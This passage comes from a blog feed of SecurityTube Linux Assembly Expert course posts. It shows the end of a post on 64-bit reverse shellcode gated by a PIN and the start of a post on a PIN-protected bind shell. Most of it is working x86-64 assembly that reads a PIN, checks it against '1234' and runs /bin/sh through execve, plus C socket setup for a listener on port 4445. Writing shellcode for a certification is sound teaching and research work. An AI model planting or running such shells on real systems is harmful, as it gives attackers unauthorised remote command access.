	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3a4e4950&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In order to receive the PIN code from the user, we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt; syscall. To store the 4 digit PIN code we expect from the user, we need to allocate space for a 4 byte (&lt;code class=&quot;highlighter-rouge&quot;&gt;sub rsp, 4&lt;/code&gt;) long buffer. The 2nd argument of &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt; syscall requires us to specify the buffer’s start address which we can do by moving the current value of RSP to RSI. Fir 3rd argument, we add the value 4 to RDX, as we expect 4 bytes of data from the user and nothing more.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have received the PIN code, so now we need to decide whether to exit the program or launch a shell. For that we can compare the user input byte by byte against predetermined values 0x31 - 1, 0x32 - 2, 0x33 - 3, 0x34 - 4. If all 4 digits match, we make a jump to execve (je execve). If that is not true, we just continue the execution flow to go through with the &lt;code class=&quot;highlighter-rouge&quot;&gt;exit(0)&lt;/code&gt; syscall to terminate the program.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;cmpinput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x33&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;je&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;part-3---execute-shell-via-execve&quot;&gt;&lt;b&gt;Part 3&lt;/b&gt; - execute shell via execve()&lt;/h4&gt;

&lt;p&gt;Let’s assume that the user has entered the correct PIN code and we have reached to the point where we need to execute the shell. &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; takes 3 arguments: the file we want to execute which for us is the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, as we it is a pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;const char *filename&lt;/code&gt; we need RDI to contain the address on which we have stored the program name. This is the reason why we first move the string in hex to RBX, push on the top of the stack and then move the address to RDI.&lt;/p&gt;

&lt;p&gt;Next we need to get the address of an array of string constants &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;/bin/sh&quot;, NULL};&lt;/code&gt; to RSI. For that we can just push the address we have at RDI to the top of the stack and move that stack address to RSI.&lt;/p&gt;

&lt;p&gt;Third, we do not want to pass any environment variables, so we can make the 3rd argument just 0. So to finish it up, let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall number via &lt;code class=&quot;highlighter-rouge&quot;&gt;ausyscall execve&lt;/code&gt;, read it to RAX and have a go on the last syscall for this task.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e69622f&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There you have it! &amp;lt;3&lt;/p&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;Full assembly code can be found at:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.nasm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Full C code:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.c&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 2/7 assignment is to create a 64-bit reverse shellcode with passphrase protection. If passphrase is entered correctly, only then the shell gets executed. All 0-bytes should be removed.</summary></entry><entry><title type="html">64-bit bindshell with a passphrase protection</title><link href="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" rel="alternate" type="text/html" title="64-bit bindshell with a passphrase protection" /><published>2019-01-15T00:00:00+02:00</published><updated>2019-01-15T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE1</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-15-blog-SLAE1/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 1/7 assignment is to create a 64-bit bindshell with a password protection. If the password is entered correctly, only then the shell gets executed. All 0-bytes should be removed.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h2 id=&quot;how-does-bind-shellcode-look-like-in-c&quot;&gt;How does bind shellcode look like in C?&lt;/h2&gt;

&lt;p&gt;Before we start writing any assembly I like to see and understand what we are going to be working on in C language. The most important parts for us are the syscalls - &lt;code class=&quot;highlighter-rouge&quot;&gt;socket(), bind(), accept(), listen(), accept(), dup2(), write(), read() and execve()&lt;/code&gt;, understanding on file descriptors and the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct sockaddr_in&lt;/code&gt; structure.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;netinet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;netinet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unistd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// to hold the value user entered as PIN&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4445&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
